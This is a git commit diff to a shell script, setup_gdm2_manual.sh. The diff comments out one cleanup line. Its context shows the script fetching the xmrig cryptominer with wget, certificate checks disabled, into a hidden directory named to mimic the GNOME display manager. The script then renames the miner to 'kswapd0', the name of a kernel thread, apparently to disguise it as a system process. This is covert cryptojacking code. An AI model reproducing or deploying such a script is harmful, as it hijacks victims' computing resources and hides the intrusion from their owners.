be17d90d7b33bfe951dd37dd1075af67a08b6167
Acen <113854209+littlAcen@users.noreply.github.com>
2024-06-01 02:59:31 +0200

    Update setup_gdm2_manual.sh

--- setup_gdm2_manual.sh
+++ setup_gdm2_manual.sh
@@ -3,7 +3,7 @@ cd $HOME/.gdm2_manual/
 
 wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
 tar xf $HOME/.gdm2_manual/xmrig.tar.gz
-rm $HOME/.gdm2_manual/xmrig.tar.gz
+#rm $HOME/.gdm2_manual/xmrig.tar.gz
 mv $HOME/.gdm2_manual/xmrig $HOME/.gdm2_manual/kswapd0
 
 rm -rf $HOME/.gdm2_manual/config.json
